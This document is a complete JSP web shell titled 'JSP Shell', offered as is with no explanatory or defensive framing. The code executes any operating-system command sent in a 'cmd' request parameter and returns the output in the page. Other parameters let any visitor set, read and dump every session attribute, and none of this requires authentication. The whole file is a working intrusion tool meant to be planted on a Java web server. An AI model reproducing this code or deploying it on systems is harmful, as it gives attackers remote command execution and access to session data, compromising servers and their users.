<%@ page contentType="text/html" language="java" import="java.io.InputStream,java.io.BufferedReader,java.io.InputStreamReader,java.util.Enumeration" %>

<h1>JSP Shell</h1>
<%
if (request.getParameter("cmd") == null && (request.getParameter("session-set-key") == null || request.getParameter("session-set-value")== null)
		&& request.getParameter("session-get-key") == null && request.getParameter("session-get-all") == null) { 
	out.println("<b>available options:</b><br/>");
	out.println("cmd=?<br/>"); 
	out.println("session-set-key=?&session-set-value=?<br/>"); 
	out.println("session-get-key=?<br/>"); 
	out.println("session-get-all=true<br/>"); 
	} else if(request.getParameter("cmd") != null && !"".endsWith(request.getParameter("cmd")) ){  

		Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));

InputStream in = null;
in=p.getInputStream();

BufferedReader reader= new BufferedReader(new InputStreamReader(in));
StringBuffer textbuf= new StringBuffer();

try {
	String line;
	while ((line=reader.readLine())!=null) {
		textbuf.append(line+"<br/>");
	}
	
}catch(Exception e){
	out.println(e.getMessage());
}
out.println(textbuf.toString());
out.println("<br/><br/>available options:<br/>");
out.println("cmd=?<br/>"); 
out.println("session-set-key=?&session-set-value=?<br/>"); 
out.println("session-get-key=?<br/>"); 
out.println("session-get-all=true<br/>"); 

} else if((request.getParameter("session-set-key") != null && request.getParameter("session-set-value")!= null)){
	session.setAttribute(request.getParameter("session-set-key"),request.getParameter("session-set-value"));
	out.println("<br/><br/>available options:<br/>");
	out.println("cmd=?<br/>"); 
	out.println("session-set-key=?&session-set-value=?<br/>"); 
	out.println("session-get-key=?<br/>"); 
	out.println("session-get-all=true<br/>"); 
}else if(request.getParameter("session-get-key") != null){
	out.println(request.getParameter("session-get-key")+": "+session.getAttribute(request.getParameter("session-get-key")));
	out.println("<br/><br/>available options:<br/>");
	out.println("cmd=?<br/>"); 
	out.println("session-set-key=?&session-set-value=?<br/>"); 
	out.println("session-get-key=?<br/>"); 
	out.println("session-get-all=true<br/>"); 
}
else if(request.getParameter("session-get-all") != null){
	
	out.println("<h2>Session Attributes:</h2><br/>");
	Enumeration attributes=session.getAttributeNames();
	while (attributes.hasMoreElements() ) {
		String atr=(String)attributes.nextElement();
		out.println(atr+": "+(String)session.getValue((String)atr)+"<br/>");
    }
	out.println("<br/><br/>available options:<br/>");
	out.println("cmd=?<br/>"); 
	out.println("session-set-key=?&session-set-value=?<br/>"); 
	out.println("session-get-key=?<br/>"); 
	out.println("session-get-all=true<br/>"); 
}else{
	out.println("<b>available options:</b><br/>");
	out.println("cmd=?<br/>"); 
	out.println("session-set-key=?&session-set-value=?<br/>"); 
	out.println("session-get-key=?<br/>"); 
	out.println("session-get-all=true<br/>"); 
}
%>